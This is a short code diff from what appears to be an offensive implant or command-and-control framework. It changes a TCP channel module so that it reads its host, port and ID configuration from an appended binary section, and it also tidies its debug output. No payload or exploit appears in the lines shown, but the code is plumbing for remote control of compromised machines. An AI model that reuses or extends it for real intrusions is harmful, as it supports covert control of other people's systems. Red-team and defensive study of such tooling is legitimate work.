@@ -136,18 +136,22 @@ BOOL TcpCleanup( CHANNEL_CONTEXT* Context ) {
     return TRUE;
 }
 
-BOOL go( IImplant* Implant, IChannel* Channel, PVOID Config, DWORD ConfigSize ) {
+char __CONFIG__[0] __attribute__((section("config")));
+char * findAppendedConfig() {
+    return (char *)&__CONFIG__;
+}
+
+BOOL go( IImplant* Implant, IChannel* Channel ) {
     datap            Parser;
     CHANNEL_CONTEXT* Context = NULL;
+    _RESOURCE*       Config  = (_RESOURCE *)findAppendedConfig();
 
     Context = RtlAllocateHeap( GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof( CHANNEL_CONTEXT ) );
     if (Context == NULL) {
         return FALSE;
     }
 
-    DBG_PRINTF( "config: %p\n", Config );
-
-    Implant->BeaconDataParse( &Parser, Config, ConfigSize );
+    Implant->BeaconDataParse( &Parser, Config->value, Config->length );
     Context->Config.ID   = Implant->BeaconDataInt( &Parser );
     Context->Config.Host = strdup( Implant->BeaconDataExtract( &Parser, NULL ) );
     Context->Config.Port = Implant->BeaconDataShort( &Parser );
@@ -164,7 +168,7 @@ BOOL go( IImplant* Implant, IChannel* Channel, PVOID Config, DWORD ConfigSize ) 
     Channel->Context     = Context;
     Channel->ContextSize = sizeof( CHANNEL_CONTEXT );
 
-    DBG_PRINTF( "channel %X registred\n", Context->Config.ID );
+    DBG_PRINTF( "channel %X registered\n", Context->Config.ID );
 
     return TRUE;
 }
